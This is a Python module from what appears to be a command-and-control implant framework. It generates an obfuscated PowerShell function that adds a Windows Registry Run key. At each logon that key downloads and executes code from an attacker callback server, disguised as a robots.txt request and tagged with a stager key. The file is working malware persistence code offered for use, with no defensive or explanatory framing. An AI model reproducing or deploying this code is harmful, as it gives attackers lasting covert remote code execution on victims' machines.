class EnablePersistence:
    # Module notes:
    #   This needs improvement, it only supports http persistence currently, and requires a restaging.
    type = "EP"
    args = None
    input = "enable_persistence"

    def process_implant_response(self):
        print("We're processing downloaded file")

    def implant_text(self):
        var = '''
function {{ ron.obf_create_persistence }}(){
    $abc = "HKCU:/Software/Microsoft/Windows/CurrentVersion/Run/"
    $key = Get-Item -LiteralPath $abc -ErrorAction SilentlyContinue
    $val = "powershell.exe -c (iex ((New-Object Net.WebClient).DownloadString('http://${{ ron.obf_callback_url }}:{{ http_port }}/robots.txt?user={{ stager_key }}')))"
    if ($key.Property -Like "{{ ron.obf_reg_key_name }}"){
        $a = 0; 
    } else {
        New-ItemProperty -Path $abc -Name {{ ron.obf_reg_key_name }} -Value $val -PropertyType "String"
    }
    $Script:tr = "Enabled"
}
'''
        return var
